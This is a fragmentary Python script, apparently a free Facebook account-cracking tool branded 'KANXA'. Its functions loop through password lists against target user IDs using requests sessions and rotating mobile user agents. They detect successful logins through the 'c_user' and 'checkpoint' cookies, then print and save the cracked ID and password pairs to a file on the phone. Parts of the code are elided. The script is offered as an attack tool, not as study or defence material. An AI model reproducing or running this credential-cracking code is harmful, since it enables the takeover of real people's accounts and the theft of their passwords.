...
◥◤
\033[91;1m--------------------------------------------
\033[97;1m>>     Owner    : 𝙆𝘼𝙉𝙓𝘼 𝙃𝙀𝙍𝙀
\033[97;1m>>     Facebook : 𝙆𝘼𝙉𝙓𝘼.𝙓𝘿
\033[97;1m>>     Version  : 1.0
\033[97;1m>>     Git hop  : 𝙆𝘼𝙉𝙓𝘼-𝙀𝙓𝙀
\033[92;1m>>     Tol Typ  : \x1b[91;1m 𝙁𝙍𝙀𝙀
\033[91;1m--------------------------------------------------""")
def linex():
	print('\033[91;1m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> 100.1 VERSION :\x1b[1;92m 1.1 ')
			print('>>>Tol Typ : \x1b[91;1m 𝙛𝙧𝙚𝙚')
			linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[XIYAD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[KANXA-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/KANXA-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in KANXA:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[KANXA-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[XIYAD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mXIYAD\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[KANXA-OK] '+uid+' | '+ps+'\33[0;97m')
